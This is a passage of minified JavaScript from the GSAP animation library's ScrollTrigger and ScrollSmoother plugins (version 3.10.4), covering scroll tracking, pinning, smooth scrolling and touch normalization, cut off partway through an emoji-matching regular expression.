=Math.ceil(x.height)+to,A.margin=A.marginTop=A.marginRight=A.marginBottom=A.marginLeft="0",A.padding=f.padding,A.paddingTop=f.paddingTop,A.paddingRight=f.paddingRight,A.paddingBottom=f.paddingBottom,A.paddingLeft=f.paddingLeft,v=function(t,e,i){for(var r,n=[],s=t.length,o=i?8:0;o<s;o+=2)r=t[o],n.push(r,r in e?e[r]:t[o+1]);return n.t=t.t,n}(m,A,ot)),i?(P=i._initted,ls(1),i.render(i.duration(),!0,!0),D=E(ct.a)-T+g+z,g!==D&&mt&&v.splice(v.length-2,2),i.render(0,!0,!0),P||i.invalidate(),ls(0)):D=g;else if(K&&At()&&!ht)for(x=K.parentNode;x&&x!==qn;)x._pinOffset&&(h-=x._pinOffset,u-=x._pinOffset),x=x.parentNode;N&&N.forEach((function(t){return t.revert(!1)})),Et.start=h,Et.end=u,o=a=At(),ht||(o<B&&At(B),Et.scroll.rec=0),Et.revert(!1),F&&(wt=-1,Et.isActive&&At(h+g*L),F.restart(!0)),is=0,i&&dt&&(i._initted||U)&&i.progress()!==U&&i.progress(U,!0).render(i.time(),!0,!0),(L!==Et.progress||ht)&&(i&&!dt&&i.totalProgress(L,!0),Et.progress=L,Et.update(0,0,1)),Q&&J&&(y._pinOffset=Math.round(Et.progress*D)),q&&q(Et)}},Et.getVelocity=function(){return(At()-a)/(Ds()-ts)*1e3||0},Et.endAnimation=function(){Xs(Et.callbackAnimation),i&&(O?O.progress(1):i.paused()?dt||Xs(i,Et.direction<0,1):Xs(i,i.reversed()))},Et.labelToScroll=function(t){return i&&i.labels&&(h||Et.refresh()||h)+i.labels[t]/i.duration()*g||0},Et.getTrailing=function(t){var e=_o.indexOf(Et),i=Et.direction>0?_o.slice(0,e).reverse():_o.slice(e+1);return(Us(t)?i.filter((function(e){return e.vars.preventOverlaps===t})):i).filter((function(t){return Et.direction>0?t.end<=h:t.start>=u}))},Et.update=function(t,e,n){if(!ht||n||t){var s,l,c,p,f,m,x,E=Et.scroll(),S=t?0:(E-h)/g,I=S<0?0:S>1?1:S||0,N=Et.progress;if(e&&(a=o,o=ht?At():E,st&&(P=R,R=i&&!dt?i.totalProgress():I)),et&&!I&&Q&&!is&&!Ts&&Ss&&h<E+(E-a)/(Ds()-ts)*et&&(I=1e-4),I!==N&&Et.enabled){if(p=(f=(s=Et.isActive=!!I&&I<1)!=(!!N&&N<1))||!!I!=!!N,Et.direction=I>N?1:-1,Et.progress=I,p&&!is&&(l=I&&!N?0:1===I?1:1===N?2:3,dt&&(c=!f&&"none"!==_t[l+1]&&_t[l+1]||_t[l],x=i&&("complete"===c||"reset"===c||c in i))),lt&&(f||x)&&(x||Z||!i)&&(ks(lt)?lt(Et):Et.getTrailing(lt).forEach((function(t){return t.endAnimation()}))),dt||(!O||is||Ts?i&&i.totalProgress(I,!!is):((ht||bs&&bs!==Et)&&O.render(O._dp._time-O._start),O.resetTo?O.resetTo("totalProgress",I,i._tTime/i._tDur):(O.vars.totalProgress=I,O.invalidate().restart()))),Q)if(t&&J&&(y.style[J+ct.os2]=w),mt){if(p){if(m=!t&&I>N&&u+1>E&&E+1>=Ls(pt,ct),ot)if(t||!s&&!m)Yo(Q,y);else{var M=ro(Q,!0),L=E-h;Yo(Q,qn,M.top+(ct===Fn?L:0)+to,M.left+(ct===Fn?0:L)+to)}Vo(s||m?v:_),D!==g&&I<1&&s||b(T+(1!==I||m?0:D))}}else b(Ps(T+D*I));st&&!r.tween&&!is&&!Ts&&F.restart(!0),$&&(f||nt&&I&&(I<1||!vs))&&Qn($.targets).forEach((function(t){return t.classList[s||nt?"add":"remove"]($.className)})),j&&!dt&&!t&&j(Et),p&&!is?(dt&&(x&&("complete"===c?i.pause().totalProgress(1):"reset"===c?i.restart(!0).pause():"restart"===c?i.restart(!0):i[c]()),j&&j(Et)),!f&&vs||(Y&&f&&js(Et,Y),vt[l]&&js(Et,vt[l]),nt&&(1===I?Et.kill(!1,1):vt[l]=0),f||vt[l=1===I?1:3]&&js(Et,vt[l])),ut&&!s&&Math.abs(Et.getVelocity())>(Gs(ut)?ut:2500)&&(Xs(Et.callbackAnimation),O?O.progress(1):Xs(i,!I,1))):dt&&j&&!is&&j(Et)}if(C){var B=ht?E/ht.duration()*(ht._caScrollDist||0):E;A(B+(d._isFlipped?1:0)),C(B)}k&&k(-E/ht.duration()*(ht._caScrollDist||0))}},Et.enable=function(e,i){Et.enabled||(Et.enabled=!0,ho(pt,"resize",To),ho(gt?Wn:pt,"scroll",Eo),bt&&ho(t,"refreshInit",bt),!1!==e&&(Et.progress=L=0,o=a=wt=At()),!1!==i&&Et.refresh())},Et.getTween=function(t){return t&&r?r.tween:O},Et.setPositions=function(t,e){Q&&(T+=t-h,D+=e-t-g),Et.start=h=t,Et.end=u=e,g=e-t,Et.update()},Et.disable=function(e,i){if(Et.enabled&&(!1!==e&&Et.revert(),Et.enabled=Et.isActive=!1,i||O&&O.pause(),B=0,n&&(n.uncache=1),bt&&uo(t,"refreshInit",bt),F&&(F.pause(),r.tween&&r.tween.kill()&&(r.tween=0)),!gt)){for(var s=_o.length;s--;)if(_o[s].scroller===pt&&_o[s]!==Et)return;uo(pt,"resize",To),uo(pt,"scroll",Eo)}},Et.kill=function(t,r){Et.disable(t,r),O&&!r&&O.kill(),W&&delete yo[W];var s=_o.indexOf(Et);s>=0&&_o.splice(s,1),s===ss&&Bo>0&&ss--,s=0,_o.forEach((function(t){return t.scroller===Et.scroller&&(s=1)})),s||(Et.scroll.rec=0),i&&(i.scrollTrigger=null,t&&i.render(-1),r||i.kill()),l&&[l,c,d,p].forEach((function(t){return t.parentNode&&t.parentNode.removeChild(t)})),bs===Et&&(bs=0),Q&&(n&&(n.uncache=1),s=0,_o.forEach((function(t){return t.pin===Q&&s++})),s||(n.spacer=0)),e.onKill&&e.onKill(Et)},Et.enable(!1,!1),G&&G(Et),i&&i.add&&!g?Xn.delayedCall(.01,(function(){return h||u||Et.refresh()}))&&(g=.01)&&(h=u=0):Et.refresh()}else this.update=this.refresh=this.kill=Rs},t.register=function(e){return jn||(Xn=e||Ns(),Os()&&window.document&&t.enable(),jn=As),jn},t.defaults=function(t){if(t)for(var e in t)po[e]=t[e];return po},t.disable=function(t,e){As=0,_o.forEach((function(i){return i[e?"kill":"disable"](t)})),uo($n,"wheel",Eo),uo(Wn,"scroll",Eo),clearInterval(es),uo(Wn,"touchcancel",Rs),uo(qn,"touchstart",Rs),ao(uo,Wn,"pointerdown,touchstart,mousedown",Cs),ao(uo,Wn,"pointerup,touchend,mouseup",Is),Kn.kill(),Bs(uo);for(var i=0;i<Dn.length;i+=3)lo(uo,Dn[i],Dn[i+1]),lo(uo,Dn[i],Dn[i+2])},t.enable=function(){if($n=window,Wn=document,Yn=Wn.documentElement,qn=Wn.body,Xn&&(Qn=Xn.utils.toArray,Jn=Xn.utils.clamp,ls=Xn.core.suppressOverwrites||Rs,Xn.core.globals("ScrollTrigger",t),qn)){As=1,Vn.register(Xn),t.isTouch=Vn.isTouch,ms=Vn.isTouch&&/(iPad|iPhone|iPod|Mac)/g.test(navigator.userAgent),ho($n,"wheel",Eo),Zn=[$n,Wn,Yn,qn],t.matchMedia({"(orientation: portrait)":function(){return bo(),bo}}),ho(Wn,"scroll",Eo);var e,i,r=qn.style,n=r.borderTopStyle;for(r.borderTopStyle="solid",e=ro(qn),Fn.m=Math.round(e.top+Fn.sc())||0,Mn.m=Math.round(e.left+Mn.sc())||0,n?r.borderTopStyle=n:r.removeProperty("border-top-style"),es=setInterval(xo,250),Xn.delayedCall(.5,(function(){return Ts=0})),ho(Wn,"touchcancel",Rs),ho(qn,"touchstart",Rs),ao(ho,Wn,"pointerdown,touchstart,mousedown",Cs),ao(ho,Wn,"pointerup,touchend,mouseup",Is),ns=Xn.utils.checkPrefix("transform"),Go.push(ns),jn=Ds(),Kn=Xn.delayedCall(.2,Fo).pause(),hs=[Wn,"visibilitychange",function(){var t=$n.innerWidth,e=$n.innerHeight;Wn.hidden?(os=t,as=e):os===t&&as===e||To()},Wn,"DOMContentLoaded",Fo,$n,"load",Fo,$n,"resize",To],Bs(ho),_o.forEach((function(t){return t.enable(0,1)})),i=0;i<Dn.length;i+=3)lo(uo,Dn[i],Dn[i+1]),lo(uo,Dn[i],Dn[i+2])}},t.config=function(e){"limitCallbacks"in e&&(vs=!!e.limitCallbacks);var i=e.syncInterval;i&&clearInterval(es)||(es=i)&&setInterval(xo,i),"ignoreMobileResize"in e&&(ps=1===t.isTouch&&e.ignoreMobileResize),"autoRefreshEvents"in e&&(Bs(uo)||Bs(ho,e.autoRefreshEvents||"none"),cs=-1===(e.autoRefreshEvents+"").indexOf("resize"))},t.scrollerProxy=function(t,e){var i=Ln(t),r=Dn.indexOf(i),n=Ms(i);~r&&Dn.splice(r,n?6:2),e&&(n?wn.unshift($n,e,qn,e,Yn,e):wn.unshift(i,e))},t.matchMedia=function(t){var e,i,r,n,s;for(i in t)r=So.indexOf(i),n=t[i],ys=i,"all"===i?n():(e=$n.matchMedia(i))&&(e.matches&&(s=n()),~r?(So[r+1]=Vs(So[r+1],n),So[r+2]=Vs(So[r+2],s)):(r=So.length,So.push(i,n,s),e.addListener?e.addListener(Ao):e.addEventListener("change",Ao)),So[r+3]=e.matches),ys=0;return So},t.clearMatchMedia=function(t){t||(So.length=0),(t=So.indexOf(t))>=0&&So.splice(t,4)},t.isInViewport=function(t,e,i){var r=(Us(t)?Ln(t):t).getBoundingClientRect(),n=r[i?qs:Zs]*e||0;return i?r.right-n>0&&r.left+n<$n.innerWidth:r.bottom-n>0&&r.top+n<$n.innerHeight},t.positionInViewport=function(t,e,i){Us(t)&&(t=Ln(t));var r=t.getBoundingClientRect(),n=r[i?qs:Zs],s=null==e?n/2:e in fo?fo[e]*n:~e.indexOf("%")?parseFloat(e)*n/100:parseFloat(e)||0;return i?(r.left+s)/$n.innerWidth:(r.top+s)/$n.innerHeight},t}();Zo.version="3.10.4",Zo.saveStyles=function(t){return t?Qn(t).forEach((function(t){if(t&&t.style){var e=Ro.indexOf(t);e>=0&&Ro.splice(e,5),Ro.push(t,t.style.cssText,t.getBBox&&t.getAttribute("transform"),Xn.core.getCache(t),ys)}})):Ro},Zo.revert=function(t,e){return Oo(!t,e)},Zo.create=function(t,e){return new Zo(t,e)},Zo.refresh=function(t){return t?To():(jn||Zo.register())&&Fo(!0)},Zo.update=Uo,Zo.clearScrollMemory=No,Zo.maxScroll=function(t,e){return Ls(t,e?Mn:Fn)},Zo.getScrollFunc=function(t,e){return Bn(Ln(t),e?Mn:Fn)},Zo.getById=function(t){return yo[t]},Zo.getAll=function(){return _o.filter((function(t){return"ScrollSmoother"!==t.vars.id}))},Zo.isScrolling=function(){return!!Ss},Zo.snapDirectional=oo,Zo.addEventListener=function(t,e){var i=Do[t]||(Do[t]=[]);~i.indexOf(e)||i.push(e)},Zo.removeEventListener=function(t,e){var i=Do[t],r=i&&i.indexOf(e);r>=0&&i.splice(r,1)},Zo.batch=function(t,e){var i,r=[],n={},s=e.interval||.016,o=e.batchMax||1e9,a=function(t,e){var i=[],r=[],n=Xn.delayedCall(s,(function(){e(i,r),i=[],r=[]})).pause();return function(t){i.length||n.restart(!0),i.push(t.trigger),r.push(t),o<=i.length&&n.progress(1)}};for(i in e)n[i]="on"===i.substr(0,2)&&ks(e[i])&&"onRefreshInit"!==i?a(0,e[i]):e[i];return ks(o)&&(o=o(),ho(Zo,"refresh",(function(){return o=e.batchMax()}))),Qn(t).forEach((function(t){var e={};for(i in n)e[i]=n[i];e.trigger=t,r.push(Zo.create(e))})),r};var Ko,Qo=function(t,e,i,r){return e>r?t(r):e<0&&t(0),i>r?(r-e)/(i-e):i<0?e/(e-i):1},Jo=function t(e,i){!0===i?e.style.removeProperty("touch-action"):e.style.touchAction=!0===i?"auto":i?"pan-"+i+(Vn.isTouch?" pinch-zoom":""):"none",e===Yn&&t(qn,i)},ta={auto:1,scroll:1},ea=function(t){var e,i=t.event,r=t.target,n=t.axis,s=(i.changedTouches?i.changedTouches[0]:i).target,o=s._gsap||Xn.core.getCache(s),a=Ds();if(!o._isScrollT||a-o._isScrollT>2e3){for(;s&&s.scrollHeight<=s.clientHeight;)s=s.parentNode;o._isScroll=s&&!Ms(s)&&s!==r&&(ta[(e=eo(s)).overflowY]||ta[e.overflowX]),o._isScrollT=a}(o._isScroll||"x"===n)&&(i._gsapAllow=!0)},ia=function(t,e,i,r){return Vn.create({target:t,capture:!0,debounce:!1,lockAxis:!0,type:e,onWheel:r=r&&ea,onPress:r,onDrag:r,onScroll:r,onEnable:function(){return i&&ho(Wn,Vn.eventTypes[0],na,!1,!0)},onDisable:function(){return uo(Wn,Vn.eventTypes[0],na,!0)}})},ra=/(input|label|select|textarea)/i,na=function(t){var e=ra.test(t.target.tagName);(e||Ko)&&(t._gsapAllow=!0,Ko=e)};Zo.sort=function(t){return _o.sort(t||function(t,e){return-1e6*(t.vars.refreshPriority||0)+t.start-(e.start+-1e6*(e.vars.refreshPriority||0))})},Zo.observe=function(t){return new Vn(t)},Zo.normalizeScroll=function(t){if(void 0===t)return ds;if(!0===t&&ds)return ds.enable();if(!1===t)return ds&&ds.kill();var e=t instanceof Vn?t:function(t){Hs(t)||(t={}),t.preventDefault=t.isNormalizer=t.allowClicks=!0,t.type||(t.type="wheel,touch"),t.debounce=!!t.debounce,t.id=t.id||"normalizer";var e,i,r,n,s,o,a,h,u=t,l=u.normalizeScrollX,c=u.momentum,d=u.allowNestedScroll,p=Ln(t.target)||Yn,f=Xn.core.globals().ScrollSmoother,g=ms&&(t.content&&Ln(t.content)||f&&f.get()&&f.get().content()),m=Bn(p,Fn),v=Bn(p,Mn),_=1,y=(Vn.isTouch&&$n.visualViewport?$n.visualViewport.scale*$n.visualViewport.width:$n.outerWidth)/$n.innerWidth,x=0,E=ks(c)?function(){return c(e)}:function(){return c||2.8},b=ia(p,t.type,!0,d),T=function(){return r=!1},D=Rs,w=Rs,S=function(){i=Ls(p,Fn),w=Jn(ms?1:0,i),l&&(D=Jn(0,Ls(p,Mn))),n=Mo},A=function(){S(),s.isActive()&&s.vars.scrollY>i&&(m()>i?s.progress(1)&&m(i):s.resetTo("scrollY",i))};return t.ignoreCheck=function(t){return ms&&"touchmove"===t.type&&function(){if(r){requestAnimationFrame(T);var t=Ps(e.deltaY/2),i=w(m.v-t);return g&&i!==m.v+m.offset&&(m.offset=i-m.v,g.style.transform="translateY("+-m.offset+"px)",g._gsap&&(g._gsap.y=-m.offset+"px"),m.cacheID=Dn.cache,Uo()),!0}g&&(g.style.transform="translateY(0px)",m.offset=m.cacheID=0,g._gsap&&(g._gsap.y="0px")),r=!0}()||_>1.05&&"touchstart"!==t.type||e.isGesturing||t.touches&&t.touches.length>1},t.onPress=function(){var t=_;_=Ps(($n.visualViewport&&$n.visualViewport.scale||1)/y),s.pause(),t!==_&&Jo(p,_>1.01||!l&&"x"),r=!1,o=v(),a=m(),S(),n=Mo},t.onRelease=t.onGestureStart=function(t,e){if(g&&(g.style.transform="translateY(0px)",m.offset=m.cacheID=0,g._gsap&&(g._gsap.y="0px")),e){Dn.cache++;var r,n,o=E();l&&(n=(r=v())+.05*o*-t.velocityX/.227,o*=Qo(v,r,n,Ls(p,Mn)),s.vars.scrollX=D(n)),n=(r=m())+.05*o*-t.velocityY/.227,o*=Qo(m,r,n,Ls(p,Fn)),s.vars.scrollY=w(n),s.invalidate().duration(o).play(.01),(ms&&s.vars.scrollY>=i||r>=i-1)&&Xn.to({},{onUpdate:A,duration:o})}else h.restart(!0)},t.onWheel=function(){s._ts&&s.pause(),Ds()-x>1e3&&(n=0,x=Ds())},t.onChange=function(t,e,i,r,s){Mo!==n&&S(),e&&l&&v(D(r[2]===e?o+(t.startX-t.x):v()+e-r[1])),i&&m(w(s[2]===i?a+(t.startY-t.y):m()+i-s[1])),Uo()},t.onEnable=function(){Jo(p,!l&&"x"),ho($n,"resize",A),b.enable()},t.onDisable=function(){Jo(p,!0),uo($n,"resize",A),b.kill()},(e=new Vn(t)).iOS=ms,ms&&!m()&&m(1),h=e._dc,s=Xn.to(e,{ease:"power4",paused:!0,scrollX:l?"+=0.1":"+=0",scrollY:"+=0.1",onComplete:h.vars.onComplete}),e}(t);return ds&&ds.target===e.target&&ds.kill(),Ms(e.target)&&(ds=e),e},Zo.core={_getVelocityProp:Un,_inputObserver:ia,_scrollers:Dn,_proxies:wn,bridge:{ss:function(){Ss||Io("scrollStart"),Ss=Ds()},ref:function(){return is}}},Ns()&&Xn.registerPlugin(Zo);var sa,oa,aa,ha,ua,la,ca,da,pa,fa,ga,ma,va,_a=function(){return"undefined"!=typeof window},ya=function(){return sa||_a()&&(sa=window.gsap)&&sa.registerPlugin&&sa},xa=(Date.now,function(t){var e=ha.querySelector(".ScrollSmoother-wrapper");return e||((e=ha.createElement("div")).classList.add("ScrollSmoother-wrapper"),t.parentNode.insertBefore(e,t),e.appendChild(t)),e}),Ea=function(){function t(e){var i=this;oa||t.register(sa)||console.warn("Please gsap.registerPlugin(ScrollSmoother)"),e=this.vars=e||{},fa&&fa.kill(),fa=this;var r,n,s,o,a,h,u,l,c,d,p,f,g,m,v=e,_=v.smoothTouch,y=v.onUpdate,x=v.onStop,E=v.smooth,b=v.onFocusIn,T=v.normalizeScroll,D=pa.getScrollFunc(aa),w=1===pa.isTouch?!0===_?.8:parseFloat(_)||0:0===E||!1===E?0:parseFloat(E)||.8,S=0,A=0,C=1,I=ma(0),R=function(){return I.update(-S)},P={y:0},O=function(){return r.style.overflow="visible"},N=function(t){t.update();var e=t.getTween();e&&(e.pause(),e._time=e._dur,e._tTime=e._tDur),g=!1,t.animation.progress(t.progress,!0)},M=function(t,e){(t!==S&&!d||e)&&(w&&(r.style.transform="matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, "+t+", 0, 1)"),A=t-S,S=t,pa.isUpdating||pa.update())},F=function(t){return arguments.length?(d?S=-t:M(-t),P.y=-t,g=!0,D(t),this):-S-D.offset},L=function(t){n.scrollTop=0,b&&!1===b(i,t)||(pa.isInViewport(t.target)||t.target===m||i.scrollTo(t.target,!1,"center center"),m=t.target)},B=function(t,e){var i,r,n,s;a.forEach((function(e){i=e.pins,s=e.markers,t.forEach((function(t){t.trigger!==e.trigger&&t.pinnedContainer!==e.trigger||e===t||(r=t.start,n=(r-e.start-e.offset)/e.ratio-(r-e.start),i.forEach((function(t){return n-=t.distance/e.ratio-t.distance})),t.setPositions(r+n,t.end+n),t.markerStart&&s.push(sa.quickSetter([t.markerStart,t.markerEnd],"y","px")),t.pin&&t.end>0&&(n=t.end-t.start,i.push({start:t.start,end:t.end,distance:n,trig:t}),e.setPositions(e.start,e.end+n),e.vars.onRefresh(e)))}))}))},U=function(){O(),requestAnimationFrame(O),a&&(a.forEach((function(t){var e=t.start,i=t.auto?Math.min(pa.maxScroll(t.scroller),t.end):e+(t.end-e)/t.ratio,r=(i-t.end)/2;e-=r,i-=r,t.offset=r||1e-4,t.pins.length=0,t.setPositions(Math.min(e,i),Math.max(e,i)),t.vars.onRefresh(t)})),B(pa.sort())),I.reset()},k=function(){return a&&a.forEach((function(t){return t.vars.onRefresh(t)}))},G=function(){return a&&a.forEach((function(t){return t.vars.onRefreshInit(t)})),k},H=function(t,e,i,r){return function(){var n="function"==typeof e?e(i,r):e;return n||0===n||(n=r.getAttribute("data-"+t)||("speed"===t?1:0)),r.setAttribute("data-"+t,n),"auto"===n?n:parseFloat(n)}},z=function(t,e,i,r){var s,o,h,u,l,c,d=H("speed",e,r,t),p=H("lag",i,r,t),f=sa.getProperty(t,"y"),g=t._gsap,m=function(){e=d(),i=p(),s=parseFloat(e)||1,l=(h="auto"===e)?0:.5,u&&u.kill(),u=i&&sa.to(t,{ease:ga,overwrite:!1,y:"+=0",duration:i}),o&&(o.ratio=s,o.autoSpeed=h)},v=function(){g.y=f+"px",g.renderTransform(1),m()},_=[],y=[],x=0,E=function(e){if(h){v();var i=function(t,e){var i,r,n=t.parentNode||ua,s=t.getBoundingClientRect(),o=n.getBoundingClientRect(),a=o.top-s.top,h=o.bottom-s.bottom,u=(Math.abs(a)>Math.abs(h)?a:h)/(1-e),l=-u*e;return u>0&&(l+=-(r=.5==(i=o.height/(aa.innerHeight+o.height))?2*o.height:2*Math.min(o.height,-u*i/(2*i-1)))/2,u+=r),{change:u,offset:l}}(t,da(0,1,-e.start/(e.end-e.start)));x=i.change,c=i.offset}else x=(e.end-e.start)*(1-s),c=0;_.forEach((function(t){return x-=t.distance*(1-s)})),e.vars.onUpdate(e),u&&u.progress(1)};return m(),(1!==s||h||u)&&(E(o=pa.create({trigger:h?t.parentNode:t,scroller:n,scrub:!0,refreshPriority:-999,onRefreshInit:v,onRefresh:E,onKill:function(t){var e=a.indexOf(t);e>=0&&a.splice(e,1),v()},onUpdate:function(t){var e,i,r,n,s=f+x*(t.progress-l),o=_.length,a=0;if(t.offset){if(o){for(i=-S,r=t.end;o--;){if((e=_[o]).trig.isActive||i>=e.start&&i<=e.end)return void(u&&(e.trig.progress+=e.trig.direction<0?.001:-.001,e.trig.update(0,0,1),u.resetTo("y",parseFloat(g.y),-A,!0),C&&u.progress(1)));i>e.end&&(a+=e.distance),r-=e.distance}s=f+a+x*((sa.utils.clamp(t.start,t.end,i)-t.start-a)/(r-t.start)-l)}n=s+c,s=Math.round(1e5*n)/1e5||0,y.length&&!h&&y.forEach((function(t){return t(s-a)})),u?(u.resetTo("y",s,-A,!0),C&&u.progress(1)):(g.y=s+"px",g.renderTransform(1))}}})),sa.core.getCache(o.trigger).stRevert=G,o.startY=f,o.pins=_,o.markers=y,o.ratio=s,o.autoSpeed=h,t.style.willChange="transform"),o};function V(){return s=r.clientHeight,r.style.overflow="visible",la.style.height=s+"px",s-aa.innerHeight}pa.addEventListener("refresh",U),sa.delayedCall(.5,(function(){return C=0})),this.scrollTop=F,this.scrollTo=function(t,e,r){var n=sa.utils.clamp(0,pa.maxScroll(aa),isNaN(t)?i.offset(t,r):+t);e?d?sa.to(i,{duration:w,scrollTop:n,overwrite:"auto",ease:ga}):D(n):F(n)},this.offset=function(t,e){var i,r=(t=ca(t)[0]).style.cssText,n=pa.create({trigger:t,start:e||"top top"});return a&&B([n]),i=n.start,n.kill(!1),t.style.cssText=r,sa.core.getCache(t).uncache=1,i},this.content=function(t){if(arguments.length){var e=ca(t||"#smooth-content")[0]||la.children[0];return e!==r&&(c=(r=e).getAttribute("style")||"",sa.set(r,{overflow:"visible",width:"100%",boxSizing:"border-box"})),this}return r},this.wrapper=function(t){return arguments.length?(n=ca(t||"#smooth-wrapper")[0]||xa(r),l=n.getAttribute("style")||"",V(),sa.set(n,w?{overflow:"hidden",position:"fixed",height:"100%",width:"100%",top:0,left:0,right:0,bottom:0}:{overflow:"visible",position:"relative",width:"100%",height:"auto",top:"auto",bottom:"auto",left:"auto",right:"auto"}),this):n},this.effects=function(t,e){var i;if(a||(a=[]),!t)return a.slice(0);(t=ca(t)).forEach((function(t){for(var e=a.length;e--;)a[e].trigger===t&&(a[e].kill(),a.splice(e,1))}));var r,n,s=e=e||{},o=s.speed,h=s.lag,u=[];for(r=0;r<t.length;r++)(n=z(t[r],o,h,r))&&u.push(n);return(i=a).push.apply(i,u),u},this.sections=function(t,e){var i;if(h||(h=[]),!t)return h.slice(0);var r=ca(t).map((function(t){return pa.create({trigger:t,start:"top 120%",end:"bottom -20%",onToggle:function(e){t.style.opacity=e.isActive?"1":"0",t.style.pointerEvents=e.isActive?"all":"none"}})}));return e&&e.add?(i=h).push.apply(i,r):h=r.slice(0),r},this.content(e.content),this.wrapper(e.wrapper),this.render=function(t){return M(t||0===t?t:S)},this.getVelocity=function(){return I.getVelocity(-S)},pa.scrollerProxy(n,{scrollTop:F,scrollHeight:function(){return V()&&la.scrollHeight},fixedMarkers:!1!==e.fixedMarkers&&!!w,content:r,getBoundingClientRect:function(){return{top:0,left:0,width:aa.innerWidth,height:aa.innerHeight}}}),pa.defaults({scroller:n});var X=pa.getAll().filter((function(t){return t.scroller===aa||t.scroller===n}));X.forEach((function(t){return t.revert(!0)})),o=pa.create({animation:sa.to(P,{y:function(){return-V()},ease:"none",data:"ScrollSmoother",duration:100,onUpdate:function(){var t=g;t&&(P.y=S,N(o)),M(P.y,t),R(),y&&!d&&y(i)}}),onRefreshInit:function(){f=S,P.y=n.scrollTop=0},id:"ScrollSmoother",scroller:aa,invalidateOnRefresh:!0,start:0,refreshPriority:-9999,end:V,onScrubComplete:function(){I.reset(),x&&x(i)},scrub:w||!0,onRefresh:function(t){N(t),P.y=-D(),M(P.y),C||t.animation.progress(sa.utils.clamp(0,1,f/-t.end))}}),this.smooth=function(t){return w=t,arguments.length?o.scrubDuration(t):o.getTween()?o.getTween().duration():0},o.getTween()&&(o.getTween().vars.ease=e.ease||ga),this.scrollTrigger=o,e.effects&&this.effects(!0===e.effects?"[data-speed], [data-lag]":e.effects,{}),e.sections&&this.sections(!0===e.sections?"[data-section]":e.sections),X.forEach((function(t){t.vars.scroller=n,t.init(t.vars,t.animation)})),this.paused=function(t,e){return arguments.length?(!!d!==t&&(t?(o.getTween()&&o.getTween().pause(),D(-S),I.reset(),(p=pa.normalizeScroll())&&p.disable(),(d=pa.observe({preventDefault:!0,type:"wheel,touch,scroll",debounce:!1,allowClicks:!0,onChangeY:function(){return F(-S)}})).nested=va(ua,"wheel,touch,scroll",!0,!1!==e)):(d.nested.kill(),d.kill(),d=0,p&&p.enable(),o.progress=(-S-o.start)/(o.end-o.start),N(o))),this):!!d},this.kill=function(){i.paused(!1),N(o),o.kill();for(var t=(a||[]).concat(h||[]),e=t.length;e--;)t[e].kill();pa.scrollerProxy(n),pa.removeEventListener("refresh",U),la.style.removeProperty("height"),n.style.cssText=l,r.style.cssText=c;var s=pa.defaults({});s&&s.scroller===n&&pa.defaults({scroller:aa}),i.normalizer&&pa.normalizeScroll(!1),clearInterval(u),fa=null,aa.removeEventListener("focusin",L)},this.refresh=function(t,e){return o.refresh(t,e)},T&&(this.normalizer=pa.normalizeScroll(!0===T?{debounce:!0,content:r}:T)),pa.config(e),"overscrollBehavior"in aa.getComputedStyle(la)&&sa.set([la,ua],{overscrollBehavior:"none"}),"scrollBehavior"in aa.getComputedStyle(la)&&sa.set([la,ua],{scrollBehavior:"auto"}),aa.addEventListener("focusin",L),u=setInterval(R,250),"loading"===ha.readyState||requestAnimationFrame((function(){return pa.refresh()}))}var e;return t.register=function(e){return oa||(sa=e||ya(),_a()&&window.document&&(aa=window,ha=document,ua=ha.documentElement,la=ha.body),sa&&(ca=sa.utils.toArray,da=sa.utils.clamp,ga=sa.parseEase("expo"),pa=sa.core.globals().ScrollTrigger,sa.core.globals("ScrollSmoother",t),la&&pa&&(ma=pa.core._getVelocityProp,va=pa.core._inputObserver,t.refresh=pa.refresh,oa=1))),oa},(e=[{key:"progress",get:function(){return this.scrollTrigger.animation._time/100}}])&&function(t,e){for(var i=0;i<e.length;i++){var r=e[i];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}(t.prototype,e),t}();Ea.version="3.10.4",Ea.create=function(t){return fa&&t&&fa.content()===ca(t.content)[0]?fa:new Ea(t)},Ea.get=function(){return fa},ya()&&sa.registerPlugin(Ea);var ba=/([\uD800-\uDBFF][\uDC00-\uDFFF](?:[\u200D\uFE0F][\uD800-\uDBFF][\uDC00-\uDFFF]){2,}|\uD83D\uDC69(?:\u200D(?:(?:\uD83D\uDC69\u200D)?\uD83D\uDC67|(?:\uD83D\uDC69\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C\uDFF3\uFE0F\u200D\uD83C\uDF08|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642]\uFE0F|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC6F\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3C-\uDD3E\uDDD6-\uDDDF])\u200D[\u2640\u2642]\uFE0F|\uD83C\uDDFD\uD83C\uDDF0|\uD83C\uDDF6\uD83C\uDDE6|\uD83C\uDDF4\uD83C\uDDF2|\uD83C\uDDE9(?:\uD83C[\uDDEA\uDDEC\uDDEF\uDDF0\uDDF2\uDDF4\uDDFF])|\uD83C\uDDF7(?:\uD83C[\uDDEA\uDDF4\uDDF8\uDDFA\uDDFC])|\uD83C\uDDE8(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDEE\uDDF0-\uDDF5\uDDF7\uDDFA-\uDDFF])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uFE0F\u200D[\u264